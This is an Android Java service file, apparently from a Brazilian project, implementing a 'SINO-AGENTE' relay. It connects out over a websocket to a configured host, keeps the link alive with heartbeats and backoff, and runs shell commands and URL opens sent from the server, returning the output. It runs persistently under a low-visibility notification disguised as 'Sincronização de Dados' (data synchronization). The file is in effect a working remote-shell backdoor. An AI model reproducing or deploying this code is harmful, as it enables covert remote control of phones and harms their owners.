package br.svc.relay;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;

import org.json.JSONObject;

import java.util.Locale;

/**
 * SINO-AGENTE — tubo de conexao com o SINO-TUBO.
 * Conecta wss saindo do aparelho (4G/5G/qualquer NAT), executa comandos,
 * responde na sala. Reconecta com backoff. Batimento a cada 25s.
 */
public class RelayService extends Service {

    private static final String CH = "sync_data_min";
    private static final int NOTIF_ID = 2002;

    private WsClient ws;
    private Handler ui;
    private volatile boolean running = true;
    private long startedAt = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        startedAt = System.currentTimeMillis();
        ui = new Handler(Looper.getMainLooper());
        goForeground();

        String url = "wss://" + BuildConfig.TUBO_HOST + "/ws?id=" + BuildConfig.POSTO
                + "&token=" + BuildConfig.TOKEN + "&role=phone";

        new Thread(() -> {
            long backoff = 3000;
            while (running) {
                try {
                    ws = new WsClient();
                    sendRaw("sat-agente online v" + BuildConfig.VERSION_NAME);
                    ws.connect(url, this::onMsg);
                    backoff = 3000; // conexao durou: reseta backoff ao cair
                } catch (Exception e) {
                    sendRaw("sat-agente erro: " + e);
                }
                if (!running) break;
                sendRaw("sat-agente reconectando em " + (backoff / 1000) + "s");
                sleep(backoff);
                backoff = Math.min(backoff * 2, 60_000);
            }
        }, "relay-conn").start();

        // batimento cardíaco
        new Thread(() -> {
            while (running) {
                sleep(25_000);
                if (ws != null && ws.isOpen()) {
                    try { ws.sendText("{\"type\":\"hb\"}"); } catch (Exception ignored) { }
                }
            }
        }, "relay-hb").start();
    }

    private void onMsg(String text) {
        try {
            JSONObject o = new JSONObject(text);
            if (!"cmd".equals(o.optString("type"))) return;
            final long rid = o.getLong("rid");
            final String cmd = o.optString("cmd", "");
            new Thread(() -> {
                String out = handle(cmd);
                try {
                    JSONObject r = new JSONObject();
                    r.put("type", "reply");
                    r.put("rid", rid);
                    r.put("out", out);
                    if (ws != null && ws.isOpen()) ws.sendText(r.toString());
                } catch (Exception e) {
                    sendRaw("sat-agente erro reply: " + e);
                }
            }, "relay-exec").start();
        } catch (Exception e) {
            sendRaw("sat-agente msg invalida: " + e);
        }
    }

    private String handle(String cmd) {
        String c = cmd.trim();
        String low = c.toLowerCase(Locale.ROOT);
        if (low.equals("ping")) return "pong";
        if (low.equals("status") || low.equals("estado")) return statusLine();
        if (low.startsWith("open ")) {
            try {
                Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(c.substring(5).trim()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                return "abrindo: " + c.substring(5).trim();
            } catch (Exception e) { return "erro open: " + e; }
        }
        if (low.startsWith("sh ")) return Exec.run(c.substring(3));
        if (low.startsWith("shell ")) return Exec.run(c.substring(6));
        return "comandos: sh <cmd> | shell <cmd> | open <url> | status | ping";
    }

    private String statusLine() {
        Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int bat = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        long upMin = (System.currentTimeMillis() - startedAt) / 60_000L;
        boolean tubo = ws != null && ws.isOpen();
        return String.format(Locale.US, "bateria %d%% · uptime %dmin · tubo %s · posto %s",
                bat, upMin, tubo ? "conectado" : "caido", BuildConfig.POSTO);
    }

    private void sendRaw(String t) {
        try { if (ws != null && ws.isOpen()) ws.sendText(t); } catch (Exception ignored) { }
    }

    private void goForeground() {
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CH, "sincronizacao de dados",
                    NotificationManager.IMPORTANCE_MIN);
            nm.createNotificationChannel(ch);
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, CH)
                : new Notification.Builder(this);
        b.setContentTitle("Sincronização de Dados")
         .setContentText("Sincronizando…")
         .setSmallIcon(android.R.drawable.stat_notify_sync)
         .setOngoing(false)
         .setShowWhen(false);
        if (Build.VERSION.SDK_INT >= 31) b.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
        startForeground(NOTIF_ID, b.build());
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) { }
    }

    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        if (ws != null) ws.close();
        super.onDestroy();
    }
}
